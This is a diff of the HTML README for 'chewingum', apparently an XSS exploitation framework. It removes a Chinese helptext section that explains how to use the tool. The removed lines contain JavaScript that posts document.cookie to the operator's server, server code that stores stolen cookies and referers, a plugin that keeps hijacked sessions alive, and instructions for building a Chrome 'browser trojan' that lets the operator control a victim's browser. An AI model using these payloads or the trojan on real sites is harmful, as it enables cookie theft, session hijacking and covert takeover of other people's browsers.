@@ -52,16 +52,7 @@ python ./chewingum.py [ host port debug | -h ]
 <ul>
 <li><a href="http://bottlepy.org/">Bottle-0.12</a></li>
 <li><a href="https://github.com/zeekay/bottle-websocket/">Bottle-websocket</a></li>
-<li>
-<p><a href="http://purecss.io/">Pure</a></p>
-
-<h2>
-<a name="unnecessaries" class="anchor" href="#unnecessaries"><span class="octicon octicon-link"></span></a>unnecessaries</h2>
-
-<ul>
-<li><a href="http://beaker.rtfd.org/">Beaker</a></li>
-</ul>
-</li>
+<li><a href="http://purecss.io/">Pure</a></li>
 </ul><h2>
 <a name="reference" class="anchor" href="#reference"><span class="octicon octicon-link"></span></a>Reference</h2>
 
@@ -79,179 +70,12 @@ python ./chewingum.py [ host port debug | -h ]
 </ul><h2>
 <a name="helptext" class="anchor" href="#helptext"><span class="octicon octicon-link"></span></a>Helptext</h2>
 
-<p><strong>1.Login</strong></p>
+<p><a href="https://github.com/quininer/gum/wiki/HelpText">HelpText</a></p>
 
-<p>采用filekey验证, 上传filekey或输入URL便可登录.</p>
+<h2>
+<a name="plugins" class="anchor" href="#plugins"><span class="octicon octicon-link"></span></a>Plugins</h2>
 
-<p><strong>2.Server</strong></p>
-
-<p>server处代码会直接在项目触发时执行,<br>
-最终会将变量serverinfo和变量browserinfo保存至数据库,<br>
-格式需为json/dict格式</p>
-
-<pre><code>{'name':'value'}
-</code></pre>
-
-<p>如:</p>
-
-<pre><code>serverinfo = {
-    'referer':b64ens(request.headers.get('Referer')),
-    'ctime':b64ens(ctime())
-}
-browserinfo = {
-    'cookie':b64ens(request.forms.cookie)
-}
-</code></pre>
-
-<p><strong>3.Server code keyword</strong></p>
-
-<p><em>ifstatus</em><br>
-对变量ifstatus赋值, 会触发对应status.<br>
-如:</p>
-
-<pre><code>ifstatus = 404
-</code></pre>
-
-<p><em>returns</em><br>
-对变量returns赋值，会返回对其赋值的内容.<br>
-如:</p>
-
-<pre><code>returns = '&lt;script&gt;alert(1)&lt;/script&gt;'
-</code></pre>
-
-<p><em>gum.backinfo</em><br>
-客户端的关键字，是一个字典，默认用来暂时记录返回的信息。<br>
-当返回之后最好清空它。</p>
-
-<pre><code>gum.backinfo = {};
-</code></pre>
-
-<p><strong>4.Project name and Object name</strong></p>
-
-<p>project 的项目名需是xss触发处的url或是domain.<br>
-$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.</p>
-
-<pre><code>object 的项目名可随意更改.
-</code></pre>
-
-<p><strong>5.Plugins</strong></p>
-
-<p>可以这样导入server扩展,</p>
-
-<pre><code>with open('./static/serv/get_info.py') as files: exec files.read()
-</code></pre>
-
-<p>也可以这样</p>
-
-<pre><code>from static.serv.email_remind import send_mail
-send_mail(gum_emailremind)
-</code></pre>
-
-<blockquote>
-<p>具体看扩展的写法</p>
-</blockquote>
-
-<p>可以这样导入browser插件,</p>
-
-<pre><code>gum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js')
-</code></pre>
-
-<p>这样给browser插件传参,</p>
-
-<pre><code>gum_boomerang = {
-    'object_url':'http://localhost/xss',
-    'post':{'xss':'yes', 'csrf':'no'},
-    'eval':function(){alert(1)}
-}
-</code></pre>
-
-<p>同样的方法给server扩展传参,</p>
-
-<pre><code>gum_keepsession = {
-    'url':referer,
-    'session':cookie,
-    'data':{'a':'b'},
-    'frequency':300,
-    'endate':'2013-12-12 15:17:00'
-}
-</code></pre>
-
-<p><strong>6.Set code</strong></p>
-
-<p>这样发送browser info,</p>
-
-<pre><code>gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})
-</code></pre>
-
-<p>单次接收browser info可以参考上面的2.server<br>
-也可以这样</p>
-
-<pre><code>browserinfo['infoname'] = b64ens(request.forms.infoname)
-</code></pre>
-
-<p>多次接收browser info可以像这样,</p>
-
-<pre><code>info_cookie = b64ens(request.forms.cookie)
-sessionid[referer][1]['cookie'] = info_cookie
-browserinfo = sessionid.get(referer)
-</code></pre>
-
-<blockquote>
-<p>不推荐使用多次接收，默认已关闭。</p>
-</blockquote>
-
-<p><strong>7.Easy example</strong></p>
-
-<p>使用基本探针:</p>
-
-<p>server:</p>
-
-<pre><code>with open('./static/serv/get_info.py') as files: exec files.read()
-</code></pre>
-
-<p>browser:</p>
-
-<pre><code>gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){
-    gum.post('http://' + gum.domain + '/ing', gum.backinfo);
-    gum.backinfo = {};
-})
-</code></pre>
-
-<p><strong>8.Console</strong></p>
-
-<p>javascript文件在</p>
-
-<pre><code>./static/brows/onexsshell.js
-</code></pre>
-
-<blockquote>
-<p>尚在测试阶段。</p>
-</blockquote>
-
-<p><strong>9.Browser trojan</strong></p>
-
-<p>chrome<br>
-修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口<br>
-使用chrome or chromium打包<br>
-安装在目标的浏览器后，使用console即可操作目标浏览器。  </p>
-
-<blockquote>
-<p>尚在测试阶段</p>
-</blockquote>
-
-<p><strong>10.Plugins header specification</strong></p>
-
-<pre><code>Author[Reference] - Date
-    Name - Dependencies
-            - Synopsis
-        Example
-            and
-        Dependencies Plus
-</code></pre>
-
-<blockquote>
-<p>好吧我知道不会有人帮我写插件的...</p>
-</blockquote>
+<p><a href="">Plugins</a></p>
 
 <h2>
 <a name="demo" class="anchor" href="#demo"><span class="octicon octicon-link"></span></a>Demo</h2>
